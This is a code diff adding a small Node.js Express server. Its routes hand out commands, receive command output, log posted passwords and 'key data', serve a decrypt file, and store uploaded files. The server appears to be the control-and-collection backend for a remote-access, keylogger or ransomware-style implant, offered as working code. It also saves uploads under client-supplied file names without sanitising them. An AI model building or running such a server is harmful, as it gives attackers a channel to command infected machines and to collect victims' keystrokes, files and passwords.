@@ -1,0 +1,87 @@
+const express = require('express');
+const fileUpload = require('express-fileupload');
+const app = express();
+var fs = require('fs');
+const bodyParser = require('body-parser');
+const PORT = 3000;
+ 
+// default options 
+app.use(fileUpload());
+app.use(bodyParser.raw({type: 'application/octet-stream'}));
+
+// CMD
+app.get('/cmd', function (req, res) {
+   // console.log('***************[Get Command]*****************');
+   res.sendFile(__dirname+"/cmd.txt");
+}) 
+
+// CMD
+app.post('/cmd', function (req, res) {
+   console.log('***************CMD = ['+ req.body.toString()+']********************');
+   fs.writeFile(__dirname+"/Download/cmd_output.txt", req.body.toString(), function(err) {
+    	if(err) {
+        	return console.log(err);
+    	}
+    	console.log("The file was saved!");
+   }); 
+   res.send('OK');
+}) 
+
+
+
+app.post('/decrypt', function (req, res) {
+   console.log('***************Password = ['+ req.body.toString()+']********************');
+   res.send('OK');
+}) 
+
+app.get('/decrypt', function (req, res) {
+   console.log('***************[Send decrypt data file]*****************');
+   res.sendFile(__dirname+"/decrypt.txt");
+}) 
+
+app.get('/ip', function (req, res) {
+   console.log('ip = '+ req.ip);
+   res.sendFile(__dirname+"/ip_address.txt");
+}) 
+
+app.get('/', function (req, res) {
+   res.sendFile(__dirname+"/index.html");
+}) 
+
+// get image
+app.post('/upload', function(req, res) {
+console.log("POST file");
+// "sampleFile" is name of file in html form
+console.log(req.files.sampleFile.name);
+  if (!req.files)
+    return res.status(400).send('No files were uploaded.');
+ 
+  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file 
+  var sampleFile = req.files.sampleFile;
+ 
+  // Use the mv() method to  
+  sampleFile.mv(__dirname+"/Download/"+req.files.sampleFile.name, function(err) {
+    if (err)
+      return res.status(500).send(err);
+ 
+    res.send('File uploaded!');
+  });
+});
+
+
+// get key data
+app.post('/data', function(req, res) {
+	// process.stdout.write(req.body.toString());
+	console.log(req.body.toString());
+	res.send('Data uploaded!');
+});
+
+
+var server = app.listen(PORT, function () {
+
+  var host = server.address().address
+  var port = server.address().port
+
+  console.log("Ung dung Node.js dang lang nghe tai dia chi: http://%s:%s", host, port)
+
+})
